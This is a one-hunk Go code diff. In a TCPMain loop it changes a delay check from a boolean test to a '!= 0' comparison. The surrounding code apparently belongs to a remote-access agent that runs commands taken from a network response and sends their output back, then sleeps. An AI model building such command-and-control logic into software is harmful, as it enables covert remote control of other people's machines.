@@ -58,7 +58,7 @@ func TCPMain() {
 			tasks.RunCommand(resp.Body)
 			returnTCPOutput()
 		}
-		if global.SecondDelayEnabled {
+		if global.SecondDelayEnabled != 0 {
 			capabilities.Sleep_now(global.SecondDelay)
 			returnTCPOutput()
 		}
